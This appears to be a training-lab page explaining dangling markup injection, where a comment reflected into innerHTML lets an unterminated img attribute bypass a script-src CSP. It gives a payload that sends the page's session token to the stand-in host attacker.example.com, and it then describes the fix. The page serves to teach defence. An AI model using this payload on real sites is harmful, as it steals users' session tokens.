Lab 32: Comments, with the same CSP as lab 31

Source: location.searchSink: innerHTML (CSP doesn't help here)

What is happening

Same script-src 'self' policy as lab 31, and the comment still goes straight into innerHTML with no sanitizing. The page also renders a session token further down, in the same innerHTML call, below the comment.

The payload doesn't use any script at all

Submit this as your comment:

<img src="https://attacker.example.com/leak?data=

No >, no closing quote. Check your browser's Network tab (open it before submitting) and you'll see a request actually go out to attacker.example.com, with the page's session token stuffed into its URL. It won't actually arrive anywhere, since that's a reserved, non-resolving example domain, picked specifically so this lab can't leak anything to a real server. The request itself is the point.

Why CSP doesn't stop this

Nothing here runs as script. The attribute you left open just keeps consuming the page's own markup, including the real token, as part of its own value, until a quote character from somewhere further down the page closes it off. That's an image load, which script-src was never meant to govern. This technique is called dangling markup injection: it steals data using nothing but HTML and the fact that an unterminated attribute keeps eating everything after it.

What would actually stop it

Fixing the sink, same as every other lab in this hub: sanitize or escape the comment before it reaches innerHTML (see lab 28), so there's no unterminated attribute to exploit in the first place. A CSP with a restrictive img-src (instead of leaving it unset, which defaults to "allow everything") would also have stopped this specific exfiltration channel, though not the underlying bug.
